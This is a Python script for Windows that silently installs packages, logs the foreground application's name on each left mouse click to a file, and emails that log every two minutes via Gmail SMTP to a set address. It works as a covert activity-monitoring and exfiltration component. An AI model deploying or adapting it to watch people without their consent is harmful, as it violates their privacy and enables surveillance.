import time
import subprocess
import sys
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import logging


# Directory Config
BASE_DIR = 'F:\\'
FILE_NAME = os.path.join(BASE_DIR, 'tracking_data.txt')

logging.basicConfig(filename=FILE_NAME, level=logging.DEBUG, format='%(message)s ===> %(asctime)s',
                    datefmt='%I:%M %p - %d/%m/%Y')

# Email Config
SUBJECT = "An email with attachment from Software"
BODY = "This is an email with attachment sent from Software"
SENDER_EMAIL = ""
RECEIVER_EMAIL = ""
PASSWORD = ""  # You need to enable 2FA and create an app to get the app password
INTERVAL = 2  # In mins

# Dependent Packages
PACKAGES = ['pynput', 'psutil', 'pywin32']


def send_email():
    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = SENDER_EMAIL
    message["To"] = RECEIVER_EMAIL
    message["Subject"] = SUBJECT

    # Add body to email
    message.attach(MIMEText(BODY, "plain"))

    # Open PDF file in binary mode
    with open(FILE_NAME, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {FILE_NAME}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        try:
            server.login(SENDER_EMAIL, PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
        except:
            print('Email send failed')


def install_packages(packages=[]):
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def on_click(x, y, button, pressed):
    import psutil
    import win32process
    import win32gui

    if pressed:
        btn = button.name
        if btn == 'left':
            if pressed:
                # hwnd = win32gui.WindowFromPoint((x, y))

                hwnd = win32gui.GetForegroundWindow()
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if pid > 0:
                    try:
                        process = psutil.Process(pid)
                        logging.info(process.name().replace('.exe', ''))
                    except:
                        print('Process not found')


def main():
    install_packages(PACKAGES)
    from pynput import mouse
    listener = mouse.Listener(on_click=on_click)
    listener.start()
    while True:
        time.sleep(INTERVAL * 60)
        send_email()


if __name__ == '__main__':
    main()
